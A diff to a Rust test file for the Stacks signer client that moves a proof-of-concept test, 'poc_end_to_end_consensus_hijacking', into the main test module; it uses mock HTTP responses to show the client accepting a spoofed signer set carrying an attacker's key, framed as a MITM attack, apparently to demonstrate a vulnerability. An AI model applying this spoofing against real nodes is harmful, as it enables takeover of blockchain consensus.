@@ -734,126 +734,6 @@ impl StacksClient {
 }
 
 #[cfg(test)]
-mod exploit_tests {
-    use super::*;
-    use blockstack_lib::chainstate::stacks::boot::{NakamotoSignerEntry, PoxStartCycleInfo, RewardSet};
-    use blockstack_lib::chainstate::stacks::address::PoxAddress;
-    use clarity::types::chainstate::{StacksPrivateKey, StacksPublicKey};
-    use crate::client::tests::{MockServerClient, write_response};
-    use std::thread::spawn;
-
-    #[test]
-    fn poc_end_to_end_consensus_hijacking() {
-        println!("[*] STARTING EXPLOIT EXECUTION: Consensus Hijacking via RPC Spoofing");
-
-        // =========================================================================
-        // 1. SETUP: KORBAN (VICTIM SIGNER) & PENYERANG (ATTACKER)
-        // =========================================================================
-        let victim_priv_key = StacksPrivateKey::random();
-        let victim_pub_key = StacksPublicKey::from_private(&victim_priv_key);
-        let mut victim_bytes = [0u8; 33];
-        victim_bytes.copy_from_slice(&victim_pub_key.to_bytes_compressed());
-
-        let attacker_priv_key = StacksPrivateKey::random();
-        let attacker_pub_key = StacksPublicKey::from_private(&attacker_priv_key);
-        let mut attacker_bytes = [0u8; 33];
-        attacker_bytes.copy_from_slice(&attacker_pub_key.to_bytes_compressed());
-
-        println!("[*] Victim Public Key   : {:?}", hex::encode(victim_bytes));
-        println!("[*] Attacker Public Key : {:?}", hex::encode(attacker_bytes));
-
-        let mock = MockServerClient::new();
-        let reward_cycle = 42;
-
-        // =========================================================================
-        // 2. BEFORE EXPLOIT (NORMAL STATE)
-        // Signer mem-polling node Stacks dan mendapatkan kunci yang sah (Victim).
-        // =========================================================================
-        let normal_stacker_set = RewardSet {
-            rewarded_addresses: vec![PoxAddress::standard_burn_address(false)],
-            start_cycle_state: PoxStartCycleInfo { missed_reward_slots: vec![] },
-            signers: Some(vec![NakamotoSignerEntry {
-                signing_key: victim_bytes,
-                stacked_amt: 50_000_000,
-                weight: 100,
-            }]),
-            pox_ustx_threshold: None,
-        };
-
-        let normal_resp = GetStackersResponse { stacker_set: normal_stacker_set };
-        let normal_json = serde_json::to_string(&normal_resp).unwrap();
-        let normal_http = format!("HTTP/1.1 200 OK\r\n\r\n{normal_json}");
-
-        // Simulasikan StacksClient mengeksekusi request di thread terpisah
-        let client_clone = mock.client.clone();
-        let h_normal = spawn(move || client_clone.get_reward_set_signers(reward_cycle));
-        
-        write_response(mock.server, normal_http.as_bytes());
-        let state_before = h_normal.join().unwrap().unwrap().unwrap();
-        
-        println!("\n[+] --- BEFORE EXPLOIT ---");
-        println!("[+] Signer State Loaded : {} entries", state_before.len());
-        println!("[+] Trusted Signer Key  : {:?}", hex::encode(state_before[0].signing_key));
-        
-        // Assert: Sebelum eksploitasi, Signer percaya pada kunci korban
-        assert_eq!(state_before[0].signing_key, victim_bytes);
-
-        // =========================================================================
-        // 3. EXECUTE EXPLOIT (STATE CORRUPTION VIA MITM)
-        // Penyerang membajak traffic plaintext HTTP (karena tidak ada mTLS/HTTPS).
-        // Penyerang menginjeksi kunci publiknya dengan weight maksimum.
-        // =========================================================================
-        println!("\n[*] INJECTING MALICIOUS RPC PAYLOAD (ARP SPOOF / DNS HIJACK)...");
-
-        let spoofed_stacker_set = RewardSet {
-            rewarded_addresses: vec![PoxAddress::standard_burn_address(false)],
-            start_cycle_state: PoxStartCycleInfo { missed_reward_slots: vec![] },
-            signers: Some(vec![NakamotoSignerEntry {
-                signing_key: attacker_bytes,   // [!] INJEKSI KUNCI PENYERANG
-                stacked_amt: 999_999_999_999,  // Memanipulasi threshold
-                weight: 100,                   // Mengambil alih 100% konsensus
-            }]),
-            pox_ustx_threshold: None,
-        };
-
-        let evil_resp = GetStackersResponse { stacker_set: spoofed_stacker_set };
-        let evil_json = serde_json::to_string(&evil_resp).unwrap();
-        let evil_http = format!("HTTP/1.1 200 OK\r\n\r\n{evil_json}");
-
-        // Kita buat server mock baru karena yang lama sudah di-consume
-        let mock_evil = MockServerClient::new();
-        let client_evil_clone = mock_evil.client.clone();
-        
-        // Runloop.rs memanggil refresh_signer_config() pada siklus baru
-        let h_evil = spawn(move || client_evil_clone.get_reward_set_signers(reward_cycle + 1));
-        
-        write_response(mock_evil.server, evil_http.as_bytes());
-        let state_after = h_evil.join().unwrap().unwrap().unwrap();
-
-        // =========================================================================
-        // 4. AFTER EXPLOIT (IMPACT VERIFICATION)
-        // =========================================================================
-        println!("\n[!] --- AFTER EXPLOIT ---");
-        println!("[!] Signer State Loaded : {} entries", state_after.len());
-        println!("[!] Trusted Signer Key  : {:?}", hex::encode(state_after[0].signing_key));
-
-        // Assert: Signer sekarang percaya secara absolut pada kunci penyerang
-        assert_eq!(
-            state_after[0].signing_key, 
-            attacker_bytes, 
-            "EXPLOIT FAILED: State did not corrupt."
-        );
-        assert_ne!(
-            state_after[0].signing_key, 
-            victim_bytes, 
-            "EXPLOIT FAILED: Victim key still trusted."
-        );
-
-        println!("[+] EXPLOIT SUCCESS: System blindly parsed malicious RPC and corrupted consensus state!");
-    }
-}
-
-#[cfg(test)]
 mod tests {
     use std::collections::BTreeMap;
     use std::thread::spawn;
@@ -1255,5 +1135,135 @@ mod tests {
             GlobalConfig::load_from_file("./src/tests/conf/signer-custom-chain-id.toml").unwrap(),
         );
         assert_eq!(mock.client.chain_id, 0x80000100);
+    }
+
+    #[test]
+    fn poc_end_to_end_consensus_hijacking() {
+        // Fungsi helper asli Rust untuk print Hex tanpa external crate
+        let to_hex_string = |bytes: &[u8]| -> String {
+            bytes.iter().map(|b| format!("{:02x}", b)).collect()
+        };
+
+        println!("\n=====================================================================");
+        println!("[*] STARTING EXPLOIT EXECUTION: Consensus Hijacking via RPC Spoofing");
+        println!("=====================================================================\n");
+
+        // =========================================================================
+        // 1. SETUP: KORBAN (VICTIM SIGNER) & PENYERANG (ATTACKER)
+        // Kita gunakan StacksPrivateKey bawaan dari scope super::*
+        // =========================================================================
+        let victim_priv_key = StacksPrivateKey::random();
+        let victim_pub_key = StacksPublicKey::from_private(&victim_priv_key);
+        let mut victim_bytes = [0u8; 33];
+        victim_bytes.copy_from_slice(&victim_pub_key.to_bytes_compressed());
+
+        let attacker_priv_key = StacksPrivateKey::random();
+        let attacker_pub_key = StacksPublicKey::from_private(&attacker_priv_key);
+        let mut attacker_bytes = [0u8; 33];
+        attacker_bytes.copy_from_slice(&attacker_pub_key.to_bytes_compressed());
+
+        println!("[*] Victim Public Key   : 0x{}", to_hex_string(&victim_bytes));
+        println!("[*] Attacker Public Key : 0x{}", to_hex_string(&attacker_bytes));
+
+        let reward_cycle = 42;
+
+        // =========================================================================
+        // 2. BEFORE EXPLOIT (NORMAL STATE)
+        // Signer mem-polling node Stacks secara normal dan mendapat respons sah.
+        // =========================================================================
+        let mock_normal = MockServerClient::new();
+        
+        let normal_stacker_set = RewardSet {
+            rewarded_addresses: vec![PoxAddress::standard_burn_address(false)],
+            start_cycle_state: PoxStartCycleInfo {
+                missed_reward_slots: vec![],
+            },
+            signers: Some(vec![NakamotoSignerEntry {
+                signing_key: victim_bytes,
+                stacked_amt: 50_000_000,
+                weight: 100,
+            }]),
+            pox_ustx_threshold: None,
+        };
+
+        let normal_resp = GetStackersResponse {
+            stacker_set: normal_stacker_set,
+        };
+        let normal_json = serde_json::to_string(&normal_resp).unwrap();
+        
+        // Memakai format HTTP persis seperti test bawaan codebase
+        let normal_http = format!("HTTP/1.1 200 OK\n\n{normal_json}");
+
+        let client_normal = mock_normal.client.clone();
+        let h_normal = spawn(move || client_normal.get_reward_set_signers(reward_cycle));
+        
+        write_response(mock_normal.server, normal_http.as_bytes());
+        let state_before = h_normal.join().unwrap().unwrap().unwrap();
+        
+        println!("\n[+] --- BEFORE EXPLOIT ---");
+        println!("[+] Signer State Loaded : {} entries", state_before.len());
+        println!("[+] Trusted Signer Key  : 0x{}", to_hex_string(&state_before[0].signing_key));
+        
+        // Assert: Sebelum eksploitasi, Signer percaya pada kunci korban
+        assert_eq!(state_before[0].signing_key, victim_bytes);
+
+        // =========================================================================
+        // 3. EXECUTE EXPLOIT (STATE CORRUPTION VIA MITM)
+        // Penyerang berada di jaringan yang sama dan membajak traffic plaintext HTTP.
+        // Penyerang menginjeksi daftar validator palsu dengan kuncinya sendiri.
+        // =========================================================================
+        println!("\n[*] INJECTING MALICIOUS RPC PAYLOAD (ARP SPOOF / DNS HIJACK)...");
+        
+        let mock_evil = MockServerClient::new();
+
+        let spoofed_stacker_set = RewardSet {
+            rewarded_addresses: vec![PoxAddress::standard_burn_address(false)],
+            start_cycle_state: PoxStartCycleInfo {
+                missed_reward_slots: vec![],
+            },
+            signers: Some(vec![NakamotoSignerEntry {
+                signing_key: attacker_bytes,   // [!] INJEKSI KUNCI PENYERANG
+                stacked_amt: 999_999_999_999,  // Mengambil alih bobot voting konsensus
+                weight: 100,
+            }]),
+            pox_ustx_threshold: None,
+        };
+
+        let evil_resp = GetStackersResponse {
+            stacker_set: spoofed_stacker_set,
+        };
+        let evil_json = serde_json::to_string(&evil_resp).unwrap();
+        let evil_http = format!("HTTP/1.1 200 OK\n\n{evil_json}");
+
+        let client_evil = mock_evil.client.clone();
+        
+        // Simulasikan runloop meminta data untuk siklus berikutnya
+        let h_evil = spawn(move || client_evil.get_reward_set_signers(reward_cycle + 1));
+        
+        write_response(mock_evil.server, evil_http.as_bytes());
+        let state_after = h_evil.join().unwrap().unwrap().unwrap();
+
+        // =========================================================================
+        // 4. AFTER EXPLOIT (IMPACT VERIFICATION)
+        // =========================================================================
+        println!("\n[!] --- AFTER EXPLOIT ---");
+        println!("[!] Signer State Loaded : {} entries", state_after.len());
+        println!("[!] Trusted Signer Key  : 0x{}", to_hex_string(&state_after[0].signing_key));
+
+        // Assert: Jika ini lolos, sistem rentan. Signer menerima kunci penyerang 
+        // dan menendang kunci korban keluar dari memori tanpa validasi kriptografis.
+        assert_eq!(
+            state_after[0].signing_key, 
+            attacker_bytes, 
+            "EXPLOIT FAILED: State did not corrupt."
+        );
+        assert_ne!(
+            state_after[0].signing_key, 
+            victim_bytes, 
+            "EXPLOIT FAILED: Victim key still trusted."
+        );
+
+        println!("[+] EXPLOIT SUCCESS: System blindly parsed malicious RPC and corrupted consensus state!");
+        println!("=====================================================================\n");
     }
 }
